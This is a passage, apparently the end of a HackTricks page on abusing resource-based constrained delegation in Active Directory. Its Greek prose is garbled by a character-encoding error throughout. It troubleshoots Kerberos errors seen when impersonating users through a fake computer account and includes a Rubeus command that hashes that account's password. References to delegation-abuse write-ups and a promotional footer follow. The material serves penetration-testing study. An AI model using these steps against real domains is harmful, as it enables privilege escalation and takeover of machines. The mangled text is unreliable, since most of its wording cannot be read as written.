* **`KRB_AP_ERR_SKEW`**: Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚ Ï„Î¿Ï… Ï„ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Ï… DC ÎºÎ±Î¹ Ï„Î¿ Kerberos Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÏƒÏ‰ÏƒÏ„Î¬.
* **`preauth_failed`**: Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ Î´Î¿Î¸Î­Î½ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· + hashes Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ Î³Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ·. ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÏ„Îµ Î¾ÎµÏ‡Î¬ÏƒÎµÎ¹ Î½Î± Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿ "$" Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Ï„Î¬ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Ï‰Î½ hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹:
* ÎŸ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÏ„Îµ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î® Ï…Ï€Î·ÏÎµÏƒÎ¯Î± (ÎµÏ€ÎµÎ¹Î´Î® Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÏ„Îµ Î® ÎµÏ€ÎµÎ¹Î´Î® Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Î±ÏÎºÎµÏ„Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±)
* Î— Î¶Î·Ï„Î¿ÏÎ¼ÎµÎ½Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ (Î±Î½ Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Î­Î½Î± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î¿ Î³Î¹Î± Ï„Î¿ winrm Î±Î»Î»Î¬ Ï„Î¿ winrm Î´ÎµÎ½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹)
* ÎŸ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯Ï‚ ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï‚ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®Ï‚ Î­Ï‡ÎµÎ¹ Ï‡Î¬ÏƒÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Î¿Ï… Ï€Î¬Î½Ï‰ ÏƒÏ„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î¹ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÏ„Îµ.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
